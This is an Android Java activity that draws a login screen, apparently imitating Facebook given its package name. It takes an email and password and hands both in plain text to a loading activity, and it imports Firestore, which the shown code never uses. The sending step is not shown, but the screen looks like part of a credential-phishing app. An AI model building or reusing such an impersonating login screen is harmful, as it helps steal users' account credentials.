package com.hivluver.facebook;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.text.method.PasswordTransformationMethod;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewTreeObserver;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import com.google.firebase.Timestamp;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutionException;

public class Login2 extends AppCompatActivity {
    EditText emailedt;
    EditText passedt;
    TextInputLayout textInputLayout;
    Button loginbtn;
    Button register;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login2);
        emailedt = findViewById(R.id.emailset);
        passedt = findViewById(R.id.passwordset);
        loginbtn = findViewById(R.id.btnlogin);
        register = findViewById(R.id.registeraccount);
        register.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Login2.this,ResetPassActivity.class);
                intent.putExtra("message","Crear cuenta");
                startActivity(intent);
            }
        });
        textInputLayout = findViewById(R.id.txtinput);
        if (getIntent().getStringExtra("type").trim().contentEquals("password")){
            passedt.requestFocus();
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.showSoftInput(passedt, InputMethodManager.SHOW_FORCED  );
            showKeyboard();
        }else {
            emailedt.requestFocus();
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.showSoftInput(emailedt, InputMethodManager.SHOW_FORCED);
            showKeyboard();
        }
        initKeyBoardListener();
        emailedt.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if (!passedt.getText().toString().trim().isEmpty()  && !s.toString().isEmpty()){
                    loginbtn.setEnabled(true);
                    loginbtn.setTextColor(getResources().getColor(android.R.color.white));
                }else{
                    loginbtn.setEnabled(false);
                    loginbtn.setTextColor(getResources().getColor(R.color.txtdisabled));
                }
            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });

        passedt.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                try {
                    if (passedt.length() == 0){
                        textInputLayout.setEndIconVisible(false);
                    }else{
                        textInputLayout.setPasswordVisibilityToggleEnabled(true);
                        textInputLayout.setEndIconVisible(true);

                    }
                    if (!emailedt.getText().toString().trim().isEmpty() && !s.toString().trim().isEmpty()){
                        loginbtn.setEnabled(true);
                        loginbtn.setTextColor(getResources().getColor(android.R.color.white));
                    }else{
                        loginbtn.setEnabled(false);
                        loginbtn.setTextColor(getResources().getColor(R.color.txtdisabled));
                    }
                }catch (Exception err){

                }

            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });
        passedt.setOnEditorActionListener(new TextView.OnEditorActionListener() {
            @Override
            public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
                if (actionId == EditorInfo.IME_ACTION_DONE) {
                    closeKeyboard();
                    Intent intent = new Intent(Login2.this,LoadingActivity.class);
                    intent.putExtra("email",emailedt.getText().toString().trim());
                    intent.putExtra("pass",passedt.getText().toString().trim());
                    startActivity(intent);
                    finish();
                    return true;
                }
                return false;
            }
        });
        loginbtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                closeKeyboard();
                Intent intent = new Intent(Login2.this,LoadingActivity.class);
                intent.putExtra("email",emailedt.getText().toString().trim());
                intent.putExtra("pass",passedt.getText().toString().trim());
                startActivity(intent);
                finish();
            }
        });

    }
    public void showKeyboard(){
        InputMethodManager inputMethodManager = (InputMethodManager) Login2.this.getSystemService(Context.INPUT_METHOD_SERVICE);
        inputMethodManager.toggleSoftInput(InputMethodManager.SHOW_FORCED, 0);
    }
    public void closeKeyboard(){
        InputMethodManager inputMethodManager = (InputMethodManager) Login2.this.getSystemService(Context.INPUT_METHOD_SERVICE);
        inputMethodManager.toggleSoftInput(InputMethodManager.HIDE_IMPLICIT_ONLY, 0);
    }

    private void initKeyBoardListener() {
        // Минимальное значение клавиатуры.
        // Threshold for minimal keyboard height.
        final int MIN_KEYBOARD_HEIGHT_PX = 150;
        // Окно верхнего уровня view.
        // Top-level window decor view.
        final View decorView = getWindow().getDecorView();
        // Регистрируем глобальный слушатель. Register global layout listener.
        decorView.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
            // Видимый прямоугольник внутри окна.
            // Retrieve visible rectangle inside window.
            private final Rect windowVisibleDisplayFrame = new Rect();
            private int lastVisibleDecorViewHeight;

            @Override
            public void onGlobalLayout() {
                decorView.getWindowVisibleDisplayFrame(windowVisibleDisplayFrame);
                final int visibleDecorViewHeight = windowVisibleDisplayFrame.height();

                if (lastVisibleDecorViewHeight != 0) {
                    if (lastVisibleDecorViewHeight > visibleDecorViewHeight + MIN_KEYBOARD_HEIGHT_PX) {
                        //Log.d("Pasha", "SHOW");
                    } else if (lastVisibleDecorViewHeight + MIN_KEYBOARD_HEIGHT_PX < visibleDecorViewHeight) {
                        finish();
                    }
                }
                // Сохраняем текущую высоту view до следующего вызова.
                // Save current decor view height for the next call.
                lastVisibleDecorViewHeight = visibleDecorViewHeight;
            }
        });
    }

    @Override
    public void onBackPressed() {
        finish();
    }
}